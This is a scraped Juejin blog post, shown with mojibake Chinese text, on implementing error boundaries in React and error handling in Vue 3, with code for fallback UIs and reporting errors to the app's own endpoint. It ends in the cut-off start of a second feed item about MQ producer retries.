.contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¼˜é›…åœ°å¤„ç†å‰ç«¯é”™è¯¯è¾¹ç•Œ</h2>
<h3 data-id="heading-1">ğŸ¤” ä¸ºä»€ä¹ˆéœ€è¦é”™è¯¯è¾¹ç•Œï¼Ÿ</h3>
<p>åœ¨å‰ç«¯å¼€å‘ä¸­ï¼Œä¸€ä¸ªç»„ä»¶çš„é”™è¯¯å¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªåº”ç”¨å´©æºƒã€‚æƒ³è±¡ä¸€ä¸‹ï¼šç”¨æˆ·æ­£åœ¨å¡«å†™ä¸€ä¸ªå¤æ‚çš„è¡¨å•ï¼Œçªç„¶å› ä¸ºæŸä¸ªç»„ä»¶çš„å°é”™è¯¯ï¼Œæ•´ä¸ªé¡µé¢ç™½å±äº†â€”â€”è¿™æ˜¯å¤šä¹ˆç³Ÿç³•çš„ç”¨æˆ·ä½“éªŒï¼</p>
<p>é”™è¯¯è¾¹ç•Œï¼ˆError Boundaryï¼‰å°±æ˜¯ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜è€Œç”Ÿçš„ã€‚å®ƒå¯ä»¥æ•è·å­ç»„ä»¶æ ‘ä¸­çš„ JavaScript é”™è¯¯ï¼Œè®°å½•é”™è¯¯ä¿¡æ¯ï¼Œå¹¶æ˜¾ç¤ºä¸€ä¸ªå¤‡ç”¨ UIï¼Œè€Œä¸æ˜¯è®©æ•´ä¸ªåº”ç”¨å´©æºƒã€‚</p>
<h3 data-id="heading-2">ğŸ’¡ React ä¸­çš„é”™è¯¯è¾¹ç•Œå®ç°</h3>
<h4 data-id="heading-3">åŸºç¡€å®ç°</h4>
<p>ğŸ’¡ <strong>é‡è¦æç¤º</strong>ï¼šæˆªè‡³ React 18ï¼Œé”™è¯¯è¾¹ç•Œ<strong>ä»ç„¶åªèƒ½é€šè¿‡ç±»ç»„ä»¶å®ç°</strong>ï¼Œè¿™æ˜¯ React æ¡†æ¶çš„é™åˆ¶ã€‚ä½†æˆ‘ä»¬å¯ä»¥ç»“åˆ Hooks æ¥ä½¿ç”¨å®ƒï¼</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// é”™è¯¯è¾¹ç•Œå¿…é¡»ä½¿ç”¨ç±»ç»„ä»¶å®ç°</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> {
  state = { <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">errorInfo</span>: <span class="hljs-literal">null</span> };

  <span class="hljs-comment">// é™æ€æ–¹æ³•ï¼Œç”¨äºåœ¨é”™è¯¯å‘ç”Ÿåæ›´æ–°çŠ¶æ€</span>
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">getDerivedStateFromError</span>(<span class="hljs-params">error</span>) {
    <span class="hljs-keyword">return</span> { <span class="hljs-attr">hasError</span>: <span class="hljs-literal">true</span>, error };
  }

  <span class="hljs-comment">// æ•è·é”™è¯¯å¹¶è®°å½•</span>
  <span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'é”™è¯¯è¾¹ç•Œæ•è·åˆ°é”™è¯¯:'</span>, error, errorInfo);
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ errorInfo });
    <span class="hljs-comment">// å¯ä»¥åœ¨è¿™é‡Œä¸ŠæŠ¥é”™è¯¯æ—¥å¿—</span>
  }

  <span class="hljs-comment">// é‡ç½®é”™è¯¯çŠ¶æ€çš„æ–¹æ³•</span>
  handleReset = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>({ <span class="hljs-attr">hasError</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">errorInfo</span>: <span class="hljs-literal">null</span> });
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">onReset</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">onReset</span>();
    }
  };

  <span class="hljs-title function_">render</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">hasError</span>) {
      <span class="hljs-comment">// æ”¯æŒè‡ªå®šä¹‰é”™è¯¯ UI</span>
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">fallbackUI</span> || (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"error-boundary"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>æŠ±æ­‰ï¼Œé¡µé¢å‡ºç°äº†é”™è¯¯ ğŸ˜¢<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"error-details"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>{this.state.error?.toString()}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">summary</span>&gt;</span>é”™è¯¯è¯¦æƒ…<span class="hljs-tag">&lt;/<span class="hljs-name">summary</span>&gt;</span>
              {this.state.errorInfo?.componentStack}
            <span class="hljs-tag">&lt;/<span class="hljs-name">details</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{this.handleReset}</span> 
            <span class="hljs-attr">className</span>=<span class="hljs-string">"retry-button"</span>
          &gt;</span>
            é‡è¯•
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
      );
    }

    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;
  }
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ErrorBoundary</span>;
</code></pre>
<h4 data-id="heading-4">Hooks + é”™è¯¯è¾¹ç•Œçš„ç»„åˆä½¿ç”¨</h4>
<p>è™½ç„¶é”™è¯¯è¾¹ç•Œæœ¬èº«éœ€è¦ç±»ç»„ä»¶ï¼Œä½†æˆ‘ä»¬å¯ä»¥åœ¨ Hooks ç»„ä»¶ä¸­è½»æ¾ä½¿ç”¨å®ƒï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">ErrorBoundary</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./ErrorBoundary'</span>;

<span class="hljs-comment">// ä¸€ä¸ªå¯èƒ½å‡ºé”™çš„ Hooks ç»„ä»¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">BuggyComponent</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  
  <span class="hljs-keyword">if</span> (count &gt; <span class="hljs-number">3</span>) {
    <span class="hljs-comment">// æ¨¡æ‹Ÿé”™è¯¯</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'è®¡æ•°è¶…è¿‡é™åˆ¶äº†ï¼'</span>);
  }
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>å½“å‰è®¡æ•°: {count}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count + 1)}&gt;å¢åŠ è®¡æ•°<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-comment">// åœ¨ä¸»ç»„ä»¶ä¸­ä½¿ç”¨é”™è¯¯è¾¹ç•ŒåŒ…è£¹</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"app"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>React é”™è¯¯è¾¹ç•Œç¤ºä¾‹<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      
      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span>
        // <span class="hljs-attr">å¯ä»¥è‡ªå®šä¹‰é”™è¯¯</span> <span class="hljs-attr">UI</span>
        <span class="hljs-attr">fallbackUI</span>=<span class="hljs-string">{</span>
          &lt;<span class="hljs-attr">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"custom-error"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>ğŸ˜± ç»„ä»¶å‡ºé”™äº†ï¼<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>è®¡æ•°ç»„ä»¶åŠ è½½å¤±è´¥ï¼Œè¯·é‡è¯•<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        }
      &gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">BuggyComponent</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
<h3 data-id="heading-5">ğŸš€ è¿›é˜¶ä¼˜åŒ–</h3>
<h4 data-id="heading-6">1. é”™è¯¯æ—¥å¿—ä¸ŠæŠ¥</h4>
<p>ç»“åˆç°ä»£ JavaScript è¯­æ³•å’Œ Fetch APIï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">componentDidCatch</span>(<span class="hljs-params">error, errorInfo</span>) {
  <span class="hljs-comment">// ä¸ŠæŠ¥é”™è¯¯ä¿¡æ¯åˆ°æœåŠ¡å™¨</span>
  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/error-report'</span>, {
    <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>
    },
    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
      <span class="hljs-attr">error</span>: error.<span class="hljs-title function_">toString</span>(),
      <span class="hljs-attr">stack</span>: errorInfo.<span class="hljs-property">componentStack</span>,
      <span class="hljs-attr">userAgent</span>: navigator.<span class="hljs-property">userAgent</span>,
      <span class="hljs-attr">url</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
    })
  })
  .<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">reportError</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'é”™è¯¯ä¸ŠæŠ¥å¤±è´¥:'</span>, reportError);
  });
}
</code></pre>
<h4 data-id="heading-7">2. æ”¯æŒé‡ç½®å›è°ƒ</h4>
<p>åœ¨ä¸Šé¢çš„åŸºç¡€å®ç°ä¸­å·²ç»åŒ…å«äº†é‡ç½®åŠŸèƒ½ï¼Œä½¿ç”¨æ–¹å¼ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript">&lt;<span class="hljs-title class_">ErrorBoundary</span>
  onReset={<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-comment">// é‡ç½®ç›¸å…³çŠ¶æ€æˆ–æ‰§è¡Œæ¸…ç†æ“ä½œ</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'é”™è¯¯è¾¹ç•Œå·²é‡ç½®'</span>);
  }}
&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">BuggyComponent</span> /&gt;</span></span>
&lt;/<span class="hljs-title class_">ErrorBoundary</span>&gt;
</code></pre>
<h3 data-id="heading-8">âš ï¸ æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-9">React é”™è¯¯è¾¹ç•Œ</h4>
<ol>
<li><strong>åªèƒ½æ•è·å­ç»„ä»¶æ ‘ä¸­çš„é”™è¯¯</strong>ï¼Œä¸èƒ½æ•è·è‡ªèº«çš„é”™è¯¯</li>
<li><strong>ä¸èƒ½æ•è·å¼‚æ­¥ä»£ç ä¸­çš„é”™è¯¯</strong>ï¼ˆå¦‚ setTimeoutã€fetch å›è°ƒç­‰ï¼‰</li>
<li><strong>ä¸èƒ½æ•è·äº‹ä»¶å¤„ç†å™¨ä¸­çš„é”™è¯¯</strong>ï¼ˆå¦‚ onClick äº‹ä»¶å¤„ç†å‡½æ•°ï¼‰</li>
<li><strong>React 16+ æ‰æ”¯æŒé”™è¯¯è¾¹ç•Œ</strong></li>
<li><strong>å¿…é¡»ä½¿ç”¨ç±»ç»„ä»¶å®ç°</strong>ï¼ˆReact æ¡†æ¶é™åˆ¶ï¼‰</li>
</ol>
<h4 data-id="heading-10">Vue 3 é”™è¯¯å¤„ç†</h4>
<ol>
<li><strong><code>onErrorCaptured</code> é’©å­åªèƒ½æ•è·å­ç»„ä»¶çš„é”™è¯¯</strong></li>
<li><strong>å¯ä»¥æ•è·æ¨¡æ¿ç¼–è¯‘å’Œæ¸²æŸ“æ—¶çš„é”™è¯¯</strong></li>
<li><strong>é»˜è®¤ä¼šå‘ä¸Šä¼ æ’­é”™è¯¯</strong>ï¼Œè¿”å› <code>false</code> å¯ä»¥é˜»æ­¢ä¼ æ’­</li>
<li><strong>å¯¹äºå¼‚æ­¥é”™è¯¯</strong>ï¼Œéœ€è¦ä½¿ç”¨ <code>try/catch</code> æˆ–å…¨å±€é”™è¯¯å¤„ç†</li>
<li><strong>Vue 3 Composition API æä¾›äº†æ›´çµæ´»çš„é”™è¯¯å¤„ç†æ–¹å¼</strong></li>
</ol>
<h3 data-id="heading-11">ğŸ¯ Vue 3 ä¸­çš„é”™è¯¯å¤„ç†å®ç°ï¼ˆSetup è¯­æ³•ç³–ï¼‰</h3>
<p>Vue 3 æä¾›äº†æ›´ç°ä»£çš„ Composition APIï¼Œç»“åˆ <code>&lt;script setup&gt;</code> è¯­æ³•ç³–ï¼Œå¯ä»¥æ›´ä¼˜é›…åœ°å®ç°é”™è¯¯å¤„ç†ï¼š</p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;slot v-if="!hasError"&gt;&lt;/slot&gt;
    &lt;div v-else class="error-boundary"&gt;
      &lt;h2&gt;æŠ±æ­‰ï¼Œé¡µé¢å‡ºç°äº†é”™è¯¯ ğŸ˜¢&lt;/h2&gt;
      &lt;div class="error-details" v-if="error"&gt;
        &lt;p&gt;{{ error.message }}&lt;/p&gt;
        &lt;details&gt;
          &lt;summary&gt;é”™è¯¯è¯¦æƒ…&lt;/summary&gt;
          &lt;pre&gt;{{ error.stack }}&lt;/pre&gt;
        &lt;/details&gt;
      &lt;/div&gt;
      &lt;button @click="handleReset" class="retry-button"&gt;
        é‡è¯•
      &lt;/button&gt;
    &lt;/div&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { ref, onErrorCaptured } from 'vue';

// å®šä¹‰ props
const props = defineProps({
  // æ”¯æŒè‡ªå®šä¹‰é”™è¯¯ UI
  fallbackUI: {
    type: Object,
    default: null
  }
});

// å®šä¹‰äº‹ä»¶
const emit = defineEmits(['reset']);

// é”™è¯¯çŠ¶æ€
const hasError = ref(false);
const error = ref(null);
const errorInfo = ref(null);

// æ•è·å­ç»„ä»¶é”™è¯¯çš„ç”Ÿå‘½å‘¨æœŸé’©å­
onErrorCaptured((err, instance, info) =&gt; {
  console.error('Vue 3 é”™è¯¯è¾¹ç•Œæ•è·åˆ°é”™è¯¯:', err, instance, info);
  hasError.value = true;
  error.value = err;
  errorInfo.value = info;
  
  // å¯ä»¥åœ¨è¿™é‡Œä¸ŠæŠ¥é”™è¯¯æ—¥å¿—
  reportError(err, info);
  
  // è¿”å› false é˜»æ­¢é”™è¯¯ç»§ç»­å‘ä¸Šä¼ æ’­
  return false;
});

// é”™è¯¯æ—¥å¿—ä¸ŠæŠ¥å‡½æ•°
const reportError = async (err, info) =&gt; {
  try {
    await fetch('/api/error-report', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        error: err.toString(),
        stack: err.stack,
        info,
        userAgent: navigator.userAgent,
        url: window.location.href,
        timestamp: new Date().toISOString()
      })
    });
  } catch (reportErr) {
    console.error('é”™è¯¯ä¸ŠæŠ¥å¤±è´¥:', reportErr);
  }
};

// é‡ç½®é”™è¯¯çŠ¶æ€
const handleReset = () =&gt; {
  hasError.value = false;
  error.value = null;
  errorInfo.value = null;
  emit('reset');
};
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-12">ä½¿ç”¨ç¤ºä¾‹</h4>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div class="app"&gt;
    &lt;h1&gt;Vue 3 é”™è¯¯å¤„ç†ç¤ºä¾‹&lt;/h1&gt;
    
    &lt;ErrorBoundary
      @reset="handleBoundaryReset"
    &gt;
      &lt;BuggyComponent /&gt;
    &lt;/ErrorBoundary&gt;
    
    &lt;!-- ä¹Ÿå¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰é”™è¯¯ UI --&gt;
    &lt;ErrorBoundary
      :fallback-ui="customFallback"
    &gt;
      &lt;AnotherBuggyComponent /&gt;
    &lt;/ErrorBoundary&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { h } from 'vue';
import ErrorBoundary from './ErrorBoundary.vue';
import BuggyComponent from './BuggyComponent.vue';
import AnotherBuggyComponent from './AnotherBuggyComponent.vue';

// è‡ªå®šä¹‰é”™è¯¯ UI
const customFallback = h('div', {
  class: 'custom-error'
}, [
  h('h3', 'ğŸ“Š å›¾è¡¨åŠ è½½å¤±è´¥'),
  h('p', 'è¯·æ£€æŸ¥ç½‘ç»œè¿æ¥åé‡è¯•'),
  h('button', {
    onClick: () =&gt; console.log('é‡è¯•æŒ‰é’®ç‚¹å‡»')
  }, 'é‡æ–°åŠ è½½')
]);

// é”™è¯¯è¾¹ç•Œé‡ç½®å›è°ƒ
const handleBoundaryReset = () =&gt; {
  console.log('é”™è¯¯è¾¹ç•Œå·²é‡ç½®ï¼Œé¡µé¢æ¢å¤æ­£å¸¸');
};
&lt;/script&gt;
</code></pre>
<h3 data-id="heading-13">ğŸ“ æ€»ç»“</h3>
<p>é”™è¯¯è¾¹ç•Œæ˜¯æå‡å‰ç«¯åº”ç”¨ç¨³å®šæ€§å’Œç”¨æˆ·ä½“éªŒçš„é‡è¦æ‰‹æ®µã€‚é€šè¿‡åˆç†ä½¿ç”¨é”™è¯¯è¾¹ç•Œï¼Œæˆ‘ä»¬å¯ä»¥ï¼š</p>
<ol>
<li>é˜²æ­¢å•ä¸ªç»„ä»¶é”™è¯¯å¯¼è‡´æ•´ä¸ªåº”ç”¨å´©æºƒ</li>
<li>æä¾›å‹å¥½çš„é”™è¯¯æç¤ºï¼Œå¼•å¯¼ç”¨æˆ·æ“ä½œ</li>
<li>æ”¶é›†é”™è¯¯ä¿¡æ¯ï¼Œå¸®åŠ©å¼€å‘è€…å¿«é€Ÿå®šä½é—®é¢˜</li>
<li>æå‡åº”ç”¨çš„ä¸“ä¸šæ„Ÿå’Œå¯é æ€§</li>
</ol>
<p>å¸Œæœ›è¿™ä¸ªå°æŠ€å·§å¯¹ä½ æœ‰æ‰€å¸®åŠ©ï¼å¦‚æœä½ æœ‰ä»»ä½•é—®é¢˜æˆ–å»ºè®®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºç•™è¨€è®¨è®º ğŸ¤—</p>
<hr/>
<p><strong>ç›¸å…³èµ„æºï¼š</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Freference%2Freact%2FComponent%23componentdidcatch" target="_blank" title="https://react.dev/reference/react/Component#componentdidcatch" ref="nofollow noopener noreferrer">React å®˜æ–¹æ–‡æ¡£ - é”™è¯¯è¾¹ç•Œ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fvuejs.org%2Fguide%2Fcomponents%2Ferror-handling.html" target="_blank" title="https://vuejs.org/guide/components/error-handling.html" ref="nofollow noopener noreferrer">Vue å®˜æ–¹æ–‡æ¡£ - é”™è¯¯å¤„ç†</a></li>
</ul>
<p><strong>æ ‡ç­¾ï¼š</strong> #React #Vue #å‰ç«¯é”™è¯¯å¤„ç† #ç”¨æˆ·ä½“éªŒä¼˜åŒ–</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MQç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶æ•è·åˆ°æ¶ˆæ¯æŠ•é€’å¤±è´¥åå¦‚ä½•é‡è¯•ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7581073928715862050</link>    <guid>https://juejin.cn/post/7581073928715862050</guid>    <pubDate>2025-12-08T06:07:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581073928715862050" data-draft-id="7581073928715845666" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MQç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶æ•è·åˆ°æ¶ˆæ¯æŠ•é€’å¤±è´¥åå¦‚ä½•é‡è¯•ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T06:07:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¥å¥‡å°æ±¤åœ†"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MQç”Ÿäº§è€…ç¡®è®¤æœºåˆ¶æ•è·åˆ°æ¶ˆæ¯æŠ•é€’å¤±è´¥åå¦‚ä½•é‡è¯•ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¥å¥‡å°æ±¤åœ†
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:07:05.000Z" title="Mon Dec 08 2025 06:07:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid 